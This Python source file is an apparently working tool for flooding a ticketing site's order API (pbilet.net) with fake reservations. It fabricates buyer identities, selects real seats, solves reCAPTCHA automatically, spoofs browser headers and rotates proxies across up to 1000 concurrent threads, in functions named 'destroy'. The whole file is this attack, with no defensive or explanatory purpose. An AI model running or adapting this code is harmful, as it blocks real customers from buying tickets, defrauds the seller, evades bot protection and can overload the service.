import itertools
import json
import os
import random as rnd
from multiprocessing.pool import ThreadPool

import grequests
import requests
from loguru import logger

from parse_module.manager import user_agent
from parse_module.utils import bot_utils
from parse_module.utils.captcha import recaptcha_v2


def destroy_a(events,
              proxy_reqs,
              child_conn,
              channel=0,
              cycle=0,
              buffer_size=10000,
              print_step=1000,
              threads=1000):
    rnd.shuffle(proxy_reqs)
    proxy_cycle = itertools.cycle(proxy_reqs)
    url = 'https://landing-api.pbilet.net/api/v1/order'

    parsed_data = data_cycle(events, buffer_size=buffer_size)
    rs = [grequests.post(url, headers=headers, timeout=30, data=data, proxies=next(proxy_cycle))
          for headers, data in parsed_data]
    if cycle == 0:
        child_conn.send(None)
        child_conn.recv()
    logger.success(f'{channel} starting...')
    for i, r in grequests.imap_enumerated(rs, size=threads, stream=True):
        if i % print_step != 0:
            continue
        try:
            text = '403 Forbidden' if '403 Forbidden' in r.text else r.text
            headers, data = parsed_data[i]
            loaded = json.loads(data)
            logger.info(f'{channel}-{i} {r.status_code} {r.url} {text} {loaded["site_url"]} {loaded}')
        except Exception as err:
            logger.warning(f'{channel}-{i} Request error {err}')


def prepare_data(event):
    mode = rnd.random()
    capitalize = rnd.random()

    first_name, second_name, middle_name = bot_utils.get_identity()
    first_name = first_name.capitalize()
    second_name = second_name.capitalize()
    middle_name = middle_name.capitalize()
    if mode < 0.5:
        identity = f'{second_name} {first_name}'
    elif mode < 0.6:
        identity = f'{first_name} {second_name}'
    elif mode < 0.8:
        identity = f'{second_name} {first_name} {middle_name}'
    elif mode < 0.9:
        identity = first_name
    else:
        identity = second_name
    if capitalize > 0.7:
        identity = identity.lower()
    phone = bot_utils.get_phone()
    ph_part1, ph_part2, ph_part3, ph_part4 = phone[:3], phone[3:6], phone[6:8], phone[8:10]
    phone = f'+7 ({ph_part1}) {ph_part2}-{ph_part3}-{ph_part4}'
    mail = bot_utils.get_email()

    ticket_amount = rnd.randint(2, 8) // 2
    domain = event['domain']
    sectors = event['seats']
    sector_name = rnd.choice(list(sectors))
    sector = sectors[sector_name]
    row = rnd.choice(list(sector))
    all_tickets = sector[row]
    start_index = rnd.randint(0, len(all_tickets) - ticket_amount)
    tickets = all_tickets[start_index: start_index + ticket_amount]

    data = {
        "utm": {},
        "form_data": {
            "payment_type": 3,
            "name": identity,
            "email": mail,
            "phone": phone,
            "terms": True
        },
        "tickets": {
            event['current_id']: tickets
        },
        "site_url": f'https://{domain}',
        "landing": event['landing'],
        "language_code": "ru",
        "payment_url_template": f"https://{domain}/ru/order/bill/{{order_hash}}",
        "success_url_path": "/order/{order_hash}/success",
        "fail_url_path": "/order/fail",
        "acquiring_id": event['acquiring_id']
    }
    prepared = json.dumps(data, ensure_ascii=False, separators=(',', ':'), allow_nan=False)
    return prepared.encode('utf-8')


def load_events(events_data, amount=0, random=False):
    all_events = []
    acquiring_on_landing = {}
    for project in events_data.values():
        for event in project['events']:
            landing = event['landing']
            acquiring_on_landing[landing] = event['acquiring_id']

    path = os.path.join('notifiers', 'all_tickets')
    files = os.listdir(path)
    if random:
        rnd.shuffle(files)
    for i, project in enumerate(files):
        if (i + 1) == amount:
            break
        logger.info(project)
        global_path = os.path.join(path, project)
        with open(global_path) as fp:
            payload = json.load(fp)
            if not payload:
                continue
            domain, data = payload.popitem()
            for event in data['events']:
                if not event['seats']:
                    continue
                acquiring_id = acquiring_on_landing[event['landing']]
                event['acquiring_id'] = acquiring_id
                if not event['seats']:
                    continue
                all_events.append(event)
    rnd.shuffle(all_events)
    return all_events


def data_cycle(events, buffer_size):
    ind = 0
    chosen = rnd.choices(events, k=buffer_size)
    if buffer_size > 1000:
        raise RuntimeError('Too many ')
    pool = ThreadPool(buffer_size)
    captchas = list(pool.map(captcha_by_event, events))
    parsed_data = []
    for event, captcha in zip(chosen, captchas):
        ind += 1
        if ind % 1000 == 0:
            logger.info(f'Events buffered {ind}')
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'ru',
            'content-type': 'application/json',
            'origin': f'https://{event["domain"]}',
            'referer': f'https://{event["domain"]}/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sp-code': captcha,
            'user-agent': user_agent.random(),
        }
        row = (headers, prepare_data(event),)
        parsed_data.append(row)
    return parsed_data


def captcha_by_event(event):
    url = f'https://{event["domain"]}/cart'
    key = event['k']
    return recaptcha_v2(key, url, invisible=True)


def destroy_test(data_gen, proxy_reqs):
    proxy_cycle = itertools.cycle(proxy_reqs)
    url = 'https://landing-api.pbilet.net/api/v1/order'
    headers, data = next(data_gen)
    r = requests.post(url, headers=headers, data=data, proxies=next(proxy_cycle))
    text = '403 Forbidden' if '403 Forbidden' in r.text else r.text
    loaded = json.loads(data)
    logger.info(f'{r.status_code} {r.url} {text} {loaded["site_url"]} {loaded}')